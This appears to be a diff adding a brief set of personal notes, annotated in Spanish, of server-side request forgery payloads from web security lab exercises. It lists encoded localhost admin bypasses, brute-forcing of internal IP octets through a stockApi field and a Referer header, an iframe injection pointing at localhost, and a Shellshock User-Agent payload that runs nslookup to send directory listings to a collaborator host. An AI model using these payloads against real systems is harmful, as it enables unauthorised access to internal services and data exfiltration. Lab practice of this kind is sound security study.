@@ -1,0 +1,13 @@
+http://localhost/admin 
+http://127.0.0.1/admin
+http://127.1/admin
+http://127.1/%25%36%31dmin --> dobleencode 2 veces la a
+http://192.168.0.141:8080 --> fuerza bruta al último octeto
+http://127.0.0.1%23@stock.weliketoshop.net/admin --> # doblencodeado
+podemos coger un campo que sea vulnerable y ponerlo en un stockApi=
+
+Referer: http://192.168.1.0:8080 --> fuerza bruta al último octeto
+User-Agent: () { :; }; /usr/bin/nslookup $(ls).$(echo "<>").collaborator.com
+
+
+{"table-html":"<div><p>Descarga maliciosda</p><iframe width='1000' height='800'  src='http://localhost:6566'"}
